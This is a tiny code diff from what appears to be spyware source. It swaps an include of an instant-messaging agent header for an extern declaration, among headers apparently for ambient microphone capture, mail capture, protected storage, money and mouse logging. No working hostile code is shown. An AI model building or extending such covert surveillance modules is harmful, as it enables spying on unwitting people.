@@ -68,7 +68,7 @@ void UnlockConfFile();
 #include "HM_AmbMic.h" // XXX da modificare 
 #include "HM_MailCap.h" // XXX da modificare 
 #include "HM_Pstorage.h" // XXX da modificare 
-#include "HM_IMAgent.h" // XXX da modificare 
+extern void PM_IMRegister();	// defined in /modules/imagent
 #include "HM_LogDevice.h" // XXX da modificare 
 #include "HM_Money.h" // XXX da modificare 
 #include "HM_MouseLog.h" // XXX da modificare
